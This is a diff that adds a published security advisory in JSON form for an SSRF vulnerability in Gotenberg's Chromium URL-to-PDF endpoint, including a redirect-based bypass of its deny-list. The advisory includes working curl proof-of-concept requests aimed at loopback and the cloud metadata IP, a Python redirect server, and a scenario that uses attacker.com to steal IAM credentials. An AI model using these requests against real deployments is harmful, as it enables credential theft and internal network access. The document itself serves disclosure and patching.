@@ -1,0 +1,45 @@
+{
+  "id": "GHSA-chwh-f6gm-r836",
+  "modified": "2026-05-11T14:12:44.377818Z",
+  "published": "2026-05-11T13:51:09Z",
+  "aliases": [
+    "CVE-2026-42595"
+  ],
+  "summary": "Gotenberg: Server-Side Request Forgery via Chromium URL Endpoint with Redirect-Based Deny-List Bypass",
+  "details": "A review of 4 published Gotenberg security advisories exposed an SSRF issue. GHSA-pjrr-jgp4-v2fm covers SSRF via the `downloadFrom` endpoint. GHSA-pcrp-7g9h-7qhp covers SSRF via the `webhook` endpoint. Neither advisory addresses SSRF through the primary Chromium URL-to-PDF conversion endpoint (`/forms/chromium/convert/url`), which has no default deny-list for HTTP/HTTPS targets. The redirect-based deny-list bypass described here also applies to `downloadFrom` and `webhook` but is a separate finding from the initial request validation those advisories cover.\n\n### Summary\n\nGotenberg's Chromium URL-to-PDF endpoint (`/forms/chromium/convert/url`) has no default protection against HTTP/HTTPS-based SSRF. The default deny-list regex only blocks `file://` URIs. An unauthenticated attacker can point Chromium at any internal IP — including loopback, RFC 1918 ranges, and cloud metadata endpoints — and receive the response rendered as a PDF.\n\nAdditionally, even when operators configure a custom deny-list, the protection is bypassed via HTTP redirects. Gotenberg's Chromium instance follows `302` redirects from an attacker-controlled external URL to internal targets without re-validating the redirect destination against the deny-list.\n\nWhat makes this particularly notable is that Gotenberg's secondary features — `downloadFrom` and `webhook` — ship with default deny-lists that explicitly block RFC 1918 and link-local addresses. The primary feature, the one that literally takes a URL and fetches it server-side, does not.\n\n### Details\n\n**Finding 1: Zero default SSRF protection on Chromium URL endpoint**\n\nThe Chromium URL endpoint is the core feature of Gotenberg. It accepts a URL, tells headless Chromium to fetch it, and returns the rendered page as a PDF. The default deny-list is configured in `pkg/modules/chromium/chromium.go` and the value shipped in Docker is:\n\n```\n^file:(?!//\\/tmp/).*\n```\n\nThis regex only blocks `file://` URIs outside of `/tmp/`. HTTP and HTTPS requests to any host — including `127.0.0.1`, `10.x.x.x`, `192.168.x.x`, and `169.254.169.254` — are not filtered at all.\n\nMeanwhile, the `downloadFrom` and `webhook` endpoints use deny-lists that explicitly block loopback, RFC 1918, and cloud metadata IPs. The developer clearly understood the SSRF risk but the protection was not applied to the main Chromium conversion endpoint.\n\n**Finding 2: Redirect-based SSRF bypass on all endpoints**\n\nBoth `downloadFrom` and `webhook` use Go's default `http.Client{}` with no `CheckRedirect` function. Go follows up to 10 redirects automatically. The deny-list is a pre-flight check on the initial URL only. Once the request is in flight, redirects are followed transparently and the application never re-validates the destination.\n\nThe Chromium browser similarly follows redirects without restriction. Even if an operator configures a custom deny-list on the Chromium URL endpoint, an attacker hosts a redirect server that passes initial validation and then redirects Chromium to an internal target.\n\n### PoC\n\nTested on Docker using `gotenberg/gotenberg:8` (v8.30.1) on `localhost:3000`. No authentication is required on any endpoint.\n\n**Environment:**\n```\n$ curl http://localhost:3000/version\n8.30.1\n\n$ curl http://localhost:3000/health\n{\"status\":\"up\",\"details\":{\"chromium\":{\"status\":\"up\"},\"libreoffice\":{\"status\":\"up\"}}}\n```\n\n**1. Control — external URL works as expected:**\n```\n$ curl -X POST http://localhost:3000/forms/chromium/convert/url \\\n    --form 'url=http://example.com' \\\n    -o test.pdf -w \"HTTP %{http_code}, Size: %{size_download} bytes\"\n\nHTTP 200, Size: 14961 bytes\n$ file test.pdf\ntest.pdf: PDF document, version 1.4, 1 page(s)\n```\n\n**2. Control — `file://` protocol is correctly blocked by default deny-list:**\n```\n$ curl -X POST http://localhost:3000/forms/chromium/convert/url \\\n    --form 'url=file:///etc/passwd' \\\n    -w \"HTTP %{http_code}\"\n\nHTTP 403\nBody: Forbidden\n```\n\n**3. SSRF to localhost — NOT blocked:**\n```\n$ curl -X POST http://localhost:3000/forms/chromium/convert/url \\\n    --form 'url=http://127.0.0.1:3000/health' \\\n    -o ssrf.pdf -w \"HTTP %{http_code}, Size: %{size_download} bytes\"\n\nHTTP 200, Size: 10196 bytes\n```\n\nChromium fetched its own `/health` endpoint and rendered the response as a PDF. The request succeeded because the default deny-list does not cover HTTP to loopback.\n\n**4. Cloud metadata IP — NOT blocked:**\n```\n$ curl --max-time 15 -X POST http://localhost:3000/forms/chromium/convert/url \\\n    --form 'url=http://169.254.169.254/latest/meta-data/' \\\n    -o meta.pdf -w \"HTTP %{http_code}, Size: %{size_download} bytes\"\n\nHTTP 000, Size: 0 bytes (timeout — no metadata service in Docker, but request was NOT blocked)\n```\n\nThe request timed out because there is no metadata service running in the Docker test environment. The critical observation is that Gotenberg did not block or reject the request. In a cloud deployment (AWS, GCP, Azure), this would return IAM credentials rendered as a PDF.\n\n**5. Redirect-based bypass — Chromium follows 302 to internal target:**\n\nRedirect server on the host (port 9999):\n```python\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(302)\n        self.send_header('Location', 'http://127.0.0.1:3000/health')\n        self.end_headers()\n    def do_HEAD(self):\n        self.do_GET()\n\nHTTPServer(('0.0.0.0', 9999), RedirectHandler).serve_forever()\n```\n\n```\n$ curl --max-time 15 -X POST http://localhost:3000/forms/chromium/convert/url \\\n    --form 'url=http://172.17.0.1:9999/' \\\n    -o redir.pdf -w \"HTTP %{http_code}, Size: %{size_download} bytes\"\n\nHTTP 200, Size: 10244 bytes\n$ file redir.pdf\nredir.pdf: PDF document, version 1.4, 1 page(s)\n```\n\nChromium followed the 302 redirect from `http://172.17.0.1:9999/` (external, passes any deny-list) to `http://127.0.0.1:3000/health` (internal). The internal response was rendered as a PDF and returned to the caller. No validation occurred on the redirect destination.\n\nThe Chromium endpoint accepted all HTTP/HTTPS URLs including loopback and cloud metadata addresses. Only `file://` URIs were blocked by the default deny-list. The redirect from an external server to `127.0.0.1` was also followed without any check on the redirect target.\n\n### Impact\n\nAny user who can reach the Gotenberg API — which requires no authentication by default — can make the server fetch arbitrary internal resources and receive the rendered content as a PDF. Gotenberg is typically deployed as a backend service in infrastructure that has broad internal network access.\n\nPractical attack scenarios:\n\n- **Cloud credential theft**: Request `http://169.254.169.254/latest/meta-data/iam/security-credentials/` to exfiltrate AWS IAM role credentials. The same applies to GCP and Azure metadata endpoints.\n- **Internal service access**: Reach any HTTP service on the internal network that the Gotenberg container can route to — admin panels, databases with HTTP interfaces, monitoring dashboards.\n- **Internal port scanning**: Use response timing and content differences to map internal infrastructure.\n- **Deny-list bypass via redirect**: Even deployments that have configured custom deny-lists for the initial URL are vulnerable. An attacker hosts a redirect server at `https://attacker.com/r` that responds with `302 → http://169.254.169.254/latest/meta-data/`. The deny-list validates the initial URL, Chromium follows the redirect, and the cloud metadata is returned as a PDF.\n\nThe redirect bypass also affects the `downloadFrom` and `webhook` endpoints, which use Go's `http.Client{}` with no `CheckRedirect` function. Their RFC 1918 deny-lists are rendered ineffective by a single redirect hop.\n\n---",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/gotenberg/gotenberg/v8",
+        "purl": "pkg:golang/github.com/gotenberg/gotenberg/v8"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "8.32.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-chwh-f6gm-r836/GHSA-chwh-f6gm-r836.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/gotenberg/gotenberg/security/advisories/GHSA-chwh-f6gm-r836"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/gotenberg/gotenberg"
+    }
+  ]
+}
